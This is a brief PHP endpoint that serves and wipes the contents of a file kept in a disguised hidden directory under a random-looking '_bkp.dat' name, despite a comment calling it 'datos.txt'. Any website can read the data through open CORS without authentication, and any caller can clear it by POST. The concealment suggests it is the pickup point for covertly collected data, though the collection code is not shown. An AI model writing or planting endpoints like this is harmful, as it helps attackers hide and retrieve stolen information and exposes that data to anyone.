<?php
// Endpoint de API para leer/limpiar datos.txt
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$file = __DIR__ . '/.sys_tmp_c4ch3/q7x2k9m4p1r8s3v6w0y5z2a8b4c7d1e3f6g9h2j5l8n1o4_bkp.dat';
$action = $_GET['action'] ?? 'read';

if ($action === 'read') {
    $content = file_exists($file) ? file_get_contents($file) : '';
    echo json_encode(['ok' => true, 'content' => $content, 'size' => strlen($content)]);

} elseif ($action === 'clear') {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        echo json_encode(['ok' => false, 'error' => 'POST required']);
        exit;
    }
    file_put_contents($file, '');
    echo json_encode(['ok' => true]);

} else {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Unknown action']);
}
